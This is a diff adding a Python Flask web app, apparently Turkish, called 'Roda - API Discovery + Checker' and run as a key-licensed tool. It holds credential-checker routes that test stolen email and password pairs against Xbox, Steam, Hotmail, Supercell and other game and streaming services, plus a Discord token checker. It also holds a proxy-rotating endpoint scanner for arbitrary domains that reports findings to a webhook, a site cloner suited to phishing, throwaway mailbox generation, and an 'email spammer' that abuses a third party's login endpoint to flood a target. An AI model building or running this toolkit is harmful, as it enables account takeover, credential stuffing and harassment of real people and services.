+        r'["\'](?:/api/|/rest/|/graphql|/v\d+/)[^"\']*["\']',
+        r'["\'](?:https?://[^"\']+/(?:api|rest|graphql|v\d+)[^"\']*)["\']',
+    ]
+    for pattern in patterns:
+        for m in re.finditer(pattern, js, re.I):
+            endpoints.add(m.group(1))
+    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
+
+def extract_from_json(obj, base_url):
+    endpoints = set()
+    if isinstance(obj, dict):
+        for k, v in obj.items():
+            if isinstance(v, str) and (v.startswith('/') or v.startswith('http')):
+                if 'api' in v or 'rest' in v or 'graphql' in v or '/v' in v:
+                    endpoints.add(v)
+            elif isinstance(v, (dict, list)):
+                endpoints.update(extract_from_json(v, base_url))
+    elif isinstance(obj, list):
+        for item in obj:
+            endpoints.update(extract_from_json(item, base_url))
+    return [urljoin(base_url, e) for e in endpoints if not e.startswith('http') or e.startswith(base_url)]
+
+def fetch_proxies():
+    sources = [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
+    ]
+    proxies = set()
+    for url in sources:
+        try:
+            r = requests.get(url, timeout=15)
+            if r.status_code == 200:
+                for line in r.text.splitlines():
+                    line = line.strip()
+                    if line and ':' in line and not line.startswith('#'):
+                        proxies.add(line)
+        except:
+            pass
+    return list(proxies)
+
+# TARAMA MOTORU (API Discovery)
+class APIScanner:
+    def __init__(self, proxy_list=None):
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json, text/plain, */*',
+        })
+        if proxy_list:
+            proxy = random.choice(proxy_list) if proxy_list else None
+            if proxy:
+                self.session.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+        self.discovered = set()
+        self.results = []
+        self.base_url = ""
+
+    def scan(self, domain):
+        self.base_url = f"https://{domain}" if not domain.startswith('http') else domain
+        self.base_url = self.base_url.rstrip('/')
+        self.results = []
+        self.discovered = set()
+        static = self._get_common_endpoints()
+        for ep in static:
+            full = urljoin(self.base_url, ep)
+            if full not in self.discovered:
+                self._test(full, ep)
+        self._crawl(self.base_url)
+        js_urls = [u for u in list(self.discovered) if u.endswith('.js')][:10]
+        for js_url in js_urls:
+            self._crawl_js(js_url)
+        api_urls = [u for u in list(self.discovered) if 'api' in u or 'rest' in u or 'graphql' in u][:20]
+        for api_url in api_urls:
+            if api_url != self.base_url and not api_url.endswith('.js') and not api_url.endswith('.css'):
+                self._crawl(api_url)
+        return self.results
+
+    def _get_common_endpoints(self):
+        return [
+            "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
+            "/rest", "/rest/v1", "/rest/v2",
+            "/graphql", "/api/graphql", "/v1/graphql",
+            "/auth", "/login", "/signin", "/signup", "/logout", "/register",
+            "/authenticate", "/token", "/oauth", "/oauth2", "/oauth/token",
+            "/user", "/users", "/account", "/profile", "/me", "/settings", "/preferences",
+            "/admin", "/dashboard", "/panel", "/manage", "/system",
+            "/health", "/ping", "/status", "/check", "/heartbeat",
+            "/search", "/query", "/find", "/list",
+            "/upload", "/download", "/file", "/files",
+            "/notify", "/notification", "/alert",
+            "/report", "/logs", "/audit", "/analytics",
+            "/config", "/configuration",
+            "/sync", "/import", "/export", "/backup",
+            "/reset", "/recover", "/verify", "/validate",
+            "/2fa", "/twofactor", "/mfa",
+            "/webhook", "/callback", "/hook",
+            "/.well-known", "/.well-known/openid-configuration", "/.well-known/jwks",
+            "/passport", "/passport/web", "/passport/web/email/login",
+            "/passport/web/phone/login", "/passport/web/sms/send",
+            "/api/user/info", "/api/user/follow", "/api/user/unfollow",
+            "/api/video/list", "/api/video/info", "/api/video/upload",
+            "/api/comment/list", "/api/comment/post", "/api/comment/delete",
+            "/api/like", "/api/unlike", "/api/share",
+            "/api/live", "/api/live/start", "/api/live/end",
+            "/api/shop", "/api/product", "/api/order",
+            "/v1/auth", "/v1/login", "/v1/logout", "/v1/register",
+            "/v1/user", "/v1/users", "/v1/account", "/v1/profile",
+            "/v1/game", "/v1/games", "/v1/inventory", "/v1/currency",
+            "/v1/friends", "/v1/groups", "/v1/chat", "/v1/messages",
+            "/v1/avatar", "/v1/outfits", "/v1/thumbnails",
+            "/v1/asset", "/v1/assets", "/v1/marketplace",
+            "/v1/developer", "/v1/universes", "/v1/places",
+            "/api/shows", "/api/movies", "/api/genres", "/api/titles",
+            "/api/search", "/api/recommendations", "/api/trending",
+            "/api/user/profile", "/api/user/history", "/api/user/ratings",
+            "/api/user/list", "/api/user/watchlist", "/api/user/continue",
+            "/api/subscription", "/api/plans", "/api/payment",
+            "/api/account", "/api/settings", "/api/devices",
+            "/api/v9", "/api/v9/auth", "/api/v9/login", "/api/v9/register",
+            "/api/v9/users", "/api/v9/guilds", "/api/v9/channels",
+            "/api/v9/messages", "/api/v9/webhooks", "/api/v9/oauth2",
+            "/api/v9/applications", "/api/v9/voice", "/api/v9/stickers",
+            "/api/v9/emojis", "/api/v9/invites", "/api/v9/connections",
+            "/api/v1/me", "/api/v1/playlists", "/api/v1/tracks", "/api/v1/albums",
+            "/api/v1/artists", "/api/v1/search", "/api/v1/recommendations",
+            "/api/v1/player", "/api/v1/queue", "/api/v1/library",
+            "/api/v1/follow", "/api/v1/shows", "/api/v1/episodes",
+            "/api/v1/users", "/api/v1/browse", "/api/v1/categories",
+            "/api/epic", "/api/epic/v1", "/api/epic/v2",
+            "/api/fortnite", "/api/fortnite/v1", "/api/fortnite/v2",
+            "/api/account", "/api/account/v1", "/api/account/v2",
+            "/api/auth", "/api/auth/v1", "/api/auth/v2",
+            "/api/catalog", "/api/catalog/v1", "/api/catalog/v2",
+            "/api/games", "/api/games/v1", "/api/games/v2",
+            "/api/launcher", "/api/launcher/v1",
+            "/api/store", "/api/store/v1", "/api/store/v2",
+            "/api/ecommerce", "/api/ecommerce/v1",
+            "/api/matchmaking", "/api/matchmaking/v1",
+            "/api/parties", "/api/parties/v1",
+            "/api/friends", "/api/friends/v1",
+            "/api/presence", "/api/presence/v1",
+            "/api/cloudstorage", "/api/cloudstorage/v1",
+            "/api/telemetry", "/api/telemetry/v1",
+            "/api/statistics", "/api/statistics/v1",
+            "/api/leaderboards", "/api/leaderboards/v1",
+            "/api/achievements", "/api/achievements/v1",
+            "/api/hesap", "/api/hesap/v1", "/api/hesap/v2",
+            "/api/oyun", "/api/oyun/v1", "/api/oyun/v2",
+            "/api/item", "/api/item/v1", "/api/item/v2",
+            "/api/sat", "/api/sat/v1", "/api/sat/v2",
+            "/api/alis", "/api/alis/v1", "/api/alis/v2",
+            "/api/bakiye", "/api/bakiye/v1",
+            "/api/profil", "/api/profil/v1",
+            "/api/giris", "/api/giris/v1", "/api/giris/v2",
+            "/api/kayit", "/api/kayit/v1",
+            "/api/sifre", "/api/sifre/v1", "/api/sifre/v2",
+            "/api/epin", "/api/epin/v1", "/api/epin/v2",
+            "/api/pin", "/api/pin/v1", "/api/pin/v2",
+            "/api/kod", "/api/kod/v1", "/api/kod/v2",
+            "/api/satin", "/api/satin/v1",
+            "/api/satiliyor", "/api/satiliyor/v1",
+            "/api/ilan", "/api/ilan/v1",
+            "/api/hesapcomtr", "/api/hesapcomtr/v1",
+            "/api/itemsatis", "/api/itemsatis/v1",
+            "/api/epinify", "/api/epinify/v1",
+            "/api/minecraft", "/api/minecraft/v1",
+        ]
+
+    def _test(self, full_url, endpoint):
+        if full_url in self.discovered:
+            return
+        self.discovered.add(full_url)
+        try:
+            r = self.session.get(full_url, timeout=3, allow_redirects=False)
+            if r.status_code < 500:
+                self.results.append({'url': full_url, 'endpoint': endpoint, 'method': 'GET', 'status': r.status_code, 'category': categorize_endpoint(endpoint)})
+        except:
+            pass
+        try:
+            r = self.session.post(full_url, json={"test": "data"}, timeout=3, allow_redirects=False)
+            if r.status_code < 500:
+                self.results.append({'url': full_url, 'endpoint': endpoint, 'method': 'POST', 'status': r.status_code, 'category': categorize_endpoint(endpoint)})
+        except:
+            pass
+
+    def _crawl(self, url):
+        try:
+            r = self.session.get(url, timeout=5, allow_redirects=False)
+            if r.status_code != 200:
+                return
+            ct = r.headers.get('Content-Type', '').lower()
+            if 'text/html' in ct:
+                for ep in extract_from_html(r.text, self.base_url):
+                    if ep not in self.discovered:
+                        self._test(ep, ep.replace(self.base_url, '') or '/')
+            elif 'application/json' in ct:
+                try:
+                    data = r.json()
+                    for ep in extract_from_json(data, self.base_url):
+                        if ep not in self.discovered:
+                            self._test(ep, ep.replace(self.base_url, '') or '/')
+                except:
+                    pass
+        except:
+            pass
+
+    def _crawl_js(self, url):
+        try:
+            r = self.session.get(url, timeout=4)
+            if r.status_code == 200:
+                for ep in extract_from_js(r.text, self.base_url):
+                    if ep not in self.discovered:
+                        self._test(ep, ep.replace(self.base_url, '') or '/')
+        except:
+            pass
+
+# ============================================================
+# FLASK ROTALARI
+# ============================================================
+@app.route("/")
+def index():
+    return HTML_TEMPLATE
+
+@app.route("/api/login", methods=["POST"])
+def login():
+    data = request.json
+    key = data.get("key", "").strip()
+    client_ip = get_client_ip()
+    valid, role, entry = is_key_valid(key)
+    if valid:
+        if entry and not entry.get("bound_ip"):
+            keys = load_keys()
+            keys[key]["bound_ip"] = client_ip
+            save_keys(keys)
+        mark_key_used(key)
+        add_log(f"Giriş başarılı: {key[:4]}... (IP: {client_ip}, Rol: {role})", "SUCCESS")
+        return jsonify({"success": True, "user": role, "isAdmin": role == "Admin"})
+    else:
+        add_log(f"Giriş başarısız: {key[:4]}... (IP: {client_ip})", "WARNING")
+        return jsonify({"success": False, "error": "Geçersiz anahtar!"})
+
+@app.route("/api/logs", methods=["GET"])
+def get_logs():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    return jsonify({"logs": LOGS[-100:]})
+
+# ---- TÜM CHECKER ROUTE'LARI ----
+@app.route("/api/tabii_check", methods=["POST"])
+def tabii_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    proxy = data.get("proxy", None)
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_tabii_account(email, password, proxy)
+    return jsonify(result)
+
+@app.route("/api/xbox_check", methods=["POST"])
+def xbox_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_xbox_account(email, password)
+    return jsonify(result)
+
+@app.route("/api/wolfteam_check", methods=["POST"])
+def wolfteam_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_wolfteam_account(email, password)
+    return jsonify(result)
+
+@app.route("/api/craftrise_check", methods=["POST"])
+def craftrise_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_craftrise_account(email, password)
+    return jsonify(result)
+
+@app.route("/api/hotmail_check", methods=["POST"])
+def hotmail_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_hotmail_account(email, password)
+    return jsonify(result)
+
+@app.route("/api/token_check", methods=["POST"])
+def token_check():
+    data = request.json
+    token_type = data.get("token_type", "discord")
+    token = data.get("token", "").strip()
+    if not token:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_token(token_type, token)
+    return jsonify(result)
+
+@app.route("/api/tiktok_gen", methods=["POST"])
+def tiktok_gen():
+    data = request.json
+    username = data.get("username", "").strip()
+    if not username:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_tiktok_username(username)
+    return jsonify(result)
+
+@app.route("/api/tiktok_gen_random", methods=["GET"])
+def tiktok_gen_random():
+    length = random.choice([4,5,6,7,8])
+    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+    result = check_tiktok_username(username)
+    return jsonify({"username": username, "result": result})
+
+@app.route("/api/steam_check", methods=["POST"])
+def steam_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    proxy = data.get("proxy", None)
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_steam_account(email, password, proxy)
+    return jsonify(result)
+
+@app.route("/api/supercell_check", methods=["POST"])
+def supercell_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    proxy = data.get("proxy", None)
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_supercell_account(email, password, proxy)
+    return jsonify(result)
+
+@app.route("/api/roda_check", methods=["POST"])
+def roda_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    proxy = data.get("proxy", None)
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_roda_inbox(email, password, proxy)
+    return jsonify(result)
+
+@app.route("/api/scan", methods=["GET"])
+def scan():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
+    domain = request.args.get("domain")
+    proxy_list = request.args.get("proxies", "").split(",") if request.args.get("proxies") else []
+    use_proxy = request.args.get("use_proxy", "false").lower() == "true"
+
+    def generate():
+        proxy_list_filtered = [p.strip() for p in proxy_list if p.strip() and ':' in p]
+        scanner = APIScanner(proxy_list_filtered if use_proxy else None)
+        results = scanner.scan(domain)
+        for res in results:
+            yield f"data: {json.dumps(res, ensure_ascii=False)}\n\n"
+        yield "data: [DONE]\n\n"
+        add_log(f"API Keşfi tamamlandı: {domain} - {len(results)} endpoint bulundu", "SUCCESS")
+
+    return Response(generate(), mimetype="text/event-stream")
+
+@app.route("/api/admin/keys")
+def admin_keys():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
+    return jsonify(load_keys())
+
+@app.route("/api/admin/generate", methods=["POST"])
+def admin_generate():
+    data = request.json
+    key = data.get("master_key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
+    note = data.get("note", "Oluşturuldu")
+    hours = int(data.get("hours", 24))
+    expires = datetime.now() + timedelta(hours=hours)
+    new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
+    keys = load_keys()
+    keys[new_key] = {"note": note, "expires": expires.isoformat(), "created": datetime.now().isoformat(), "used": False, "bound_ip": None}
+    save_keys(keys)
+    add_log(f"Yeni key oluşturuldu: {new_key} - {note} ({hours} saat)", "SUCCESS")
+    return jsonify({"success": True, "key": new_key, "expires": expires.strftime("%Y-%m-%d %H:%M:%S")})
+
+@app.route("/api/admin/delete", methods=["POST"])
+def admin_delete():
+    data = request.json
+    key = data.get("master_key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
+    keys = load_keys()
+    target = data.get("target_key", "")
+    if target in keys:
+        del keys[target]
+        save_keys(keys)
+        add_log(f"Key silindi: {target}", "INFO")
+        return jsonify({"success": True})
+    return jsonify({"success": False})
+
+@app.route("/api/admin/webhook", methods=["POST"])
+def admin_webhook():
+    data = request.json
+    key = data.get("master_key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz! Sadece admin"}), 401
+    url = data.get("webhook_url")
+    endpoints = data.get("endpoints", [])
+    categories = data.get("categories", [])
+    if not url or not endpoints:
+        return jsonify({"success": False, "message": "Eksik parametre"}), 400
+    filtered = [ep for ep in endpoints if ep['category'] in categories]
+    if not filtered:
+        return jsonify({"success": False, "message": "Seçili kategoride endpoint yok"}), 400
+    content = "🔱 RODA API TARAMA RAPORU\n"
+    content += "=" * 60 + "\n\n"
+    for cat in categories:
+        eps = [ep for ep in filtered if ep['category'] == cat]
+        if eps:
+            content += f"[ {cat.upper()} ] ({len(eps)} endpoint)\n"
+            content += "-" * 40 + "\n"
+            for ep in eps:
+                content += f"[{ep['method']}] {ep['url']}  →  HTTP {ep['status']}\n"
+            content += "\n"
+    content += "=" * 60 + "\n"
+    content += f"Toplam: {len(filtered)} endpoint\n"
+    content += f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+    files = {'file': ('roda_api_scan.txt', content)}
+    try:
+        r = requests.post(url, data={'content': '🔱 **Roda API Taraması Tamamlandı!**'}, files=files, timeout=10)
+        add_log(f"Webhook gönderildi: {len(filtered)} endpoint", "SUCCESS")
+        return jsonify({"success": r.status_code in [200, 204]})
+    except:
+        return jsonify({"success": False}), 500
+
+@app.route("/api/fetch_proxies", methods=["GET"])
+def fetch_proxies_route():
+    try:
+        proxies = fetch_proxies()
+        add_log(f"{len(proxies)} proxy çekildi", "INFO")
+        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)})
+
+# ============================================================
+# SİTE KOPYALA (ADMIN)
+# ============================================================
+@app.route("/api/sitecopy", methods=["POST"])
+def sitecopy():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+
+    data = request.json
+    url = data.get("url", "").strip()
+    if not url:
+        return jsonify({"error": "URL gerekli"}), 400
+
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+        }
+        resp = requests.get(url, headers=headers, timeout=15)
+        resp.raise_for_status()
+        soup = BeautifulSoup(resp.text, 'html.parser')
+
+        base_tag = soup.new_tag('base', href=url)
+        if soup.head:
+            soup.head.insert(0, base_tag)
+        else:
+            new_head = soup.new_tag('head')
+            new_head.append(base_tag)
+            soup.html.insert(0, new_head)
+
+        html_content = soup.prettify()
+        add_log(f"Site kopyalandı: {url}", "SUCCESS")
+        return Response(html_content, mimetype='text/html', headers={'Content-Disposition': f'attachment; filename="kopyalanan_site.html"'})
+    except Exception as e:
+        add_log(f"Site kopyalama hatası: {url} - {str(e)}", "ERROR")
+        return jsonify({"error": str(e)}), 500
+
+# ============================================================
+# TEMP MAIL (ADMIN)
+# ============================================================
+def generate_temp_mail():
+    try:
+        dom_res = requests.get("https://api.mail.tm/domains", timeout=10).json()
+        domain = dom_res['hydra:member'][0]['domain']
+        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        email = f"{user}@{domain}"
+        create_payload = {"address": email, "password": password}
+        requests.post("https://api.mail.tm/accounts", json=create_payload, timeout=10)
+        token_res = requests.post("https://api.mail.tm/token", json=create_payload, timeout=10).json()
+        token = token_res['token']
+        return {"success": True, "email": email, "password": password, "token": token}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+def get_temp_mail_messages(token):
+    try:
+        headers = {"Authorization": f"Bearer {token}"}
+        res = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
+        if res.status_code == 200:
+            return {"success": True, "messages": res.json().get('hydra:member', [])}
+        return {"success": False, "error": f"Sunucu Hatası: {res.status_code}"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+def read_temp_mail(token, msg_id):
+    try:
+        headers = {"Authorization": f"Bearer {token}"}
+        res = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers, timeout=10)
+        if res.status_code == 200:
+            return {"success": True, "message": res.json()}
+        return {"success": False, "error": f"Mesaj Alınamadı: {res.status_code}"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.route("/api/temp_mail_generate", methods=["POST"])
+def temp_mail_generate():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    result = generate_temp_mail()
+    return jsonify(result)
+
+@app.route("/api/temp_mail_refresh", methods=["POST"])
+def temp_mail_refresh():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    token = data.get("token", "")
+    if not token:
+        return jsonify({"error": "Token gerekli"}), 400
+    result = get_temp_mail_messages(token)
+    return jsonify(result)
+
+@app.route("/api/temp_mail_read", methods=["POST"])
+def temp_mail_read():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    token = data.get("token", "")
+    msg_id = data.get("msg_id", "")
+    if not token or not msg_id:
+        return jsonify({"error": "Token ve msg_id gerekli"}), 400
+    result = read_temp_mail(token, msg_id)
+    return jsonify(result)
+
+# ============================================================
+# EMAIL SPAMMER (ADMIN)
+# ============================================================
+def send_spam_email(target_email):
+    try:
+        headers = {
+            'authority': 'api.kidzapp.com',
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': generate_user_agent()
+        }
+        data = {'email': target_email, 'sdk': 'web', 'platform': 'desktop'}
+        res = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=data, timeout=5)
+        if '"message":"EMAIL SENT"' in res.text:
+            return {"success": True, "message": "Paket iletildi"}
+        else:
+            return {"success": False, "message": "Sunucu isteği reddetti"}
+    except Exception as e:
+        return {"success": False, "message": str(e)[:60]}
+
+@app.route("/api/spam_send", methods=["POST"])
+def spam_send():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    email = data.get("email", "").strip()
+    if not email:
+        return jsonify({"error": "Email gerekli"}), 400
+    result = send_spam_email(email)
+    return jsonify(result)
+
+# ============================================================
+# HTML (MAVİ TEMA + KAR TANELERİ + TÜM MENÜ)
+# ============================================================
+HTML_TEMPLATE = r"""
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Roda - API Discovery + Checker</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
+body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
+:root{--p:#3b82f6;--p2:#6366f1;--g:#10b981;--r:#ef4444;--card:#0f172a;--border:rgba(59,130,246,0.2);--bg:#0a0e1a;--sidebar:#020617;--text:#e8edf5;--muted:#94a3b8;--gold:#fbbf24}
+.snowflakes{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden}
+.snowflake{position:absolute;color:#fff;font-size:1.5em;top:-10%;animation:fall linear infinite;opacity:0.7}
+@keyframes fall{0%{transform:translateY(0) rotate(0deg) scale(0.5);opacity:0.8}100%{transform:translateY(110vh) rotate(720deg) scale(1.2);opacity:0.2}}
+#login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg);background-image:radial-gradient(circle at 30% 40%, rgba(59,130,246,0.08),transparent 50%),radial-gradient(circle at 70% 60%, rgba(99,102,241,0.08),transparent 50%)}
+#login-box{width:420px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 30px 60px rgba(0,0,0,0.5);z-index:10}
+#login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+#login-box h1{font-size:28px;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+#login-box .sub{color:var(--muted);margin-bottom:25px;font-size:14px}
+.inp{width:100%;padding:14px 18px;background:rgba(0,0,0,0.4);border:1px solid var(--border);color:#fff;border-radius:14px;font-size:15px;outline:none;transition:0.3s}
+.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(59,130,246,0.08)}
+.btn{padding:15px;border:none;border-radius:14px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;width:100%;font-size:16px;transition:0.3s}
+.btn:hover{transform:translateY(-2px);box-shadow:0 12px 24px rgba(59,130,246,0.25)}
+.btn.sm{width:auto;padding:8px 16px;font-size:12px}
+.btn.g{background:var(--g)}.btn.r{background:var(--r)}.btn.b{background:#1a73e8}
+#sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto;position:relative;z-index:2}
+.sidebar-header{padding:18px 20px;text-align:center;border-bottom:1px solid var(--border)}
+.sidebar-header .logo-text{font-size:24px;font-weight:900;letter-spacing:2px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.sidebar-header .version{font-size:10px;color:var(--muted);letter-spacing:1px;margin-top:2px}
+.sidebar-nav{flex:1;padding:12px 12px;overflow-y:auto}
+.nav-divider{padding:8px 12px;font-size:10px;color:#475569;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px}
+.nav-item{display:flex;align-items:center;gap:12px;padding:9px 14px;border-radius:8px;cursor:pointer;color:#94a3b8;font-weight:500;font-size:13px;transition:0.2s;margin-top:2px}
+.nav-item:hover{background:rgba(59,130,246,0.06);color:#fff}
+.nav-item.active{background:rgba(59,130,246,0.12);color:var(--p);border-left:3px solid var(--p)}
+.nav-item i{font-size:16px;width:22px;text-align:center}
+.nav-divider-admin{padding:8px 12px;font-size:10px;color:#475569;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px;border-top:1px solid var(--border)}
+.sidebar-stats{padding:10px 14px;border-top:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px}
+.mini-stat{flex:1;min-width:44%;background:var(--card);padding:6px 4px;border-radius:8px;text-align:center;border:1px solid rgba(255,255,255,0.03)}
+.mini-stat .val{font-size:14px;font-weight:800;color:var(--text)}
+.mini-stat .lbl{font-size:8px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
+.mini-hit .val{color:var(--g)}.mini-2fa .val{color:var(--gold)}.mini-bad .val{color:var(--r)}.mini-check .val{color:var(--p)}
+.sidebar-footer{padding:10px;text-align:center;font-size:9px;color:#334155;border-top:1px solid var(--border)}
+#app{display:none;flex:1;flex-direction:column;height:100vh;position:relative;z-index:1}
+.topbar{display:flex;align-items:center;gap:16px;padding:10px 20px;background:var(--card);border-bottom:1px solid var(--border)}
+.topbar-title{font-size:15px;font-weight:700;color:var(--text)}
+.topbar-title i{margin-right:8px;color:var(--p)}
+.topbar-right{margin-left:auto;display:flex;align-items:center;gap:14px}
+.pulse-dot{width:10px;height:10px;border-radius:50%;background:var(--g);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
+.pulse-dot.idle{background:#475569;animation:none}
+.main-content{flex:1;display:flex;overflow:hidden;background:var(--bg)}
+.page{display:none;flex:1;flex-direction:column;padding:14px 18px;overflow-y:auto}
+.page.active{display:flex}
+.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 16px;margin-bottom:12px}
+.card h3{font-size:14px;font-weight:700;margin-bottom:8px;color:var(--text)}
+.card h3 i{color:var(--p);margin-right:6px}
+.stats-row{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:12px}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px;text-align:center}
+.stat-card .stat-val{font-size:22px;font-weight:800}
+.stat-card .stat-lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
+.stat-hit .stat-val{color:var(--g)}.stat-2fa .stat-val{color:var(--gold)}.stat-bad .stat-val{color:var(--r)}.stat-total .stat-val{color:var(--p)}.stat-error .stat-val{color:#f59e0b}
+.result-header{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;border-bottom:1px solid var(--border)}
+.result-row{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
+.result-row:hover{background:rgba(59,130,246,0.03)}
+.hit{color:var(--g)}.bad{color:var(--r)}.twofa{color:var(--gold)}.error{color:#f59e0b}
+.method{font-weight:600;padding:1px 6px;border-radius:4px;font-size:9px;display:inline-block}
+.method.get{background:rgba(16,185,129,0.12);color:var(--g)}
+.method.post{background:rgba(59,130,246,0.12);color:#448aff}
+.method.other{background:rgba(245,158,11,0.12);color:#f59e0b}
+.category{padding:1px 8px;border-radius:12px;font-size:9px;font-weight:500;display:inline-block}
+.cat-auth{background:rgba(239,68,68,0.12);color:#ef4444}
+.cat-admin{background:rgba(245,158,11,0.12);color:#f59e0b}
+.cat-user{background:rgba(16,185,129,0.12);color:var(--g)}
+.cat-health{background:rgba(59,130,246,0.12);color:#448aff}
+.cat-api{background:rgba(59,130,246,0.12);color:var(--p)}
+.cat-genel{background:rgba(255,255,255,0.04);color:#94a3b8}
+.scan-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.scan-top input{flex:1;min-width:150px;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px;outline:none}
